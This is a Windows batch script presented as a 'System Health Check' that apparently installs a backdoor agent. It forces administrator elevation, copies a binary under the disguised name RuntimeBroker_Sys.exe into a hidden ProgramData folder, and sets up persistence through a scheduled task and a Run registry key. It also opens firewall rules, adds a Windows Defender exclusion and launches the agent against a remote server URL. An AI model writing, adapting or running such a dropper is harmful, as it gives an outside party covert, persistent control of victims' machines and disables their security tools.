@echo off
title System Health Check
color 0A

:: 1. Force Administrator Elevation
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Requesting Full System Permissions...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /B
)
pushd "%CD%"
CD /D "%~dp0"

echo ==========================================================
echo    SYSTEM HEALTH MONITOR - DEPLOYMENT ENGINE
echo ==========================================================
echo.

set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"
set "REG_KEY=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=WindowsSystemHealth"

:: Auto-detect server IP or use hardcoded
set "SERVER_URL=https://h-boss-production.up.railway.app"

:: 2. Kill any old instances
echo [+] Clearing old instances...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1

:: 3. Create install directory (hidden + system)
echo [+] Preparing system directory...
if exist "%INSTALL_DIR%" (
   attrib -h -s "%INSTALL_DIR%" /D /S >nul 2>&1
   takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
   icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
   icacls.exe "%INSTALL_DIR%" /remove:d Everyone /T /C /Q >nul 2>&1
   icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib +h "%INSTALL_DIR%"

:: 4. Copy agent binary
echo [+] Installing service binary...
if not exist "teram_agent.exe" (
    echo [ERROR] teram_agent.exe not found! Place it next to this script.
    pause
    exit
)
if exist "%INSTALL_DIR%\%BIN_NAME%" (
    attrib -h -s "%INSTALL_DIR%\%BIN_NAME%" >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%\%BIN_NAME%" /A >nul 2>&1
    icacls.exe "%INSTALL_DIR%\%BIN_NAME%" /reset >nul 2>&1
    ren "%INSTALL_DIR%\%BIN_NAME%" "%BIN_NAME%.old-%RANDOM%" >nul 2>&1
)
copy /Y "teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
attrib +h "%INSTALL_DIR%\%BIN_NAME%"

:: Clean up old VBS if upgrading from previous install
if exist "%INSTALL_DIR%\service.vbs" del /F /Q "%INSTALL_DIR%\service.vbs" >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1

:: Set proper ACLs so SYSTEM and Admins can run the exe
icacls "%INSTALL_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\Users:(OI)(CI)RX" /T /C /Q >nul 2>&1

:: 5. Create persistence via Scheduled Task (ONLOGON + HIGHEST privileges)
echo [+] Registering auto-start...
schtasks /Create /TN "%TASK_NAME%" /TR "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /SC ONLOGON /RL HIGHEST /F >nul

:: 6. Backup persistence via Registry Run key
echo [+] Registering backup auto-start...
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /f >nul

:: 7. Firewall rules
echo [+] Configuring firewall...
netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul

:: 8. Windows Defender exclusion
echo [+] Adding security exclusion...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: 9. Launch immediately
echo [+] Starting service...
start "" /B "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%

echo.
echo ==========================================================
echo    DEPLOYMENT COMPLETE
echo ==========================================================
echo Install Path: %INSTALL_DIR%
echo Auto-Start:   Scheduled Task + Registry
echo Firewall:     Allowed
echo Status:       RUNNING
echo.
echo You can now delete this folder safely.
echo The service will auto-start on every login.
echo.
timeout /t 5 >nul
exit
